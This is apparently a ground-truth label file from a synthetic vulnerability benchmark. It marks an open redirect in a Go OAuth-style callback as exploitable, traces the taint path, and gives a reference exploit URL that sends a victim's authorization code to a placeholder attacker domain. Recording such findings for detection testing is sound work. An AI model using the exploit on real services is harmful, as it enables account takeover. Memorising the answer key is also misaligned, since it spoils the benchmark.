@@ -1,0 +1,28 @@
+id: gt-450
+source_project: synthetic-phase30
+commit_hash: synthetic-no-commit
+cwe_id: CWE-601
+cwe_name: URL Redirection to Untrusted Site ('Open Redirect')
+label: true_positive
+affected_files:
+- eval/synthetic/phase30/advanced/gt-450.go
+line_numbers:
+- 8
+taint_source: r.URL.Query().Get("next")
+taint_sink: http.Redirect()
+taint_path:
+- the attacker supplies a malicious next URL into the OAuth-style callback
+- the handler mints an authorization code for the chosen user session
+- http.Redirect(...) appends the code onto the attacker-controlled next URL
+- the attacker receives the leaked code and exchanges it for a valid access token
+complexity: multi_step
+exploitable: true
+reference_exploit: Call /callback?next=https://attacker.example/cb&user=victim to
+  receive the victim authorization code at the attacker domain.
+reference_fix_commit: null
+notes: Open-redirect attack chain that leaks an authorization code to an attacker-controlled
+  domain.
+discovery_method: synthetic
+language: go
+framework: go
+taint_step_count: 4
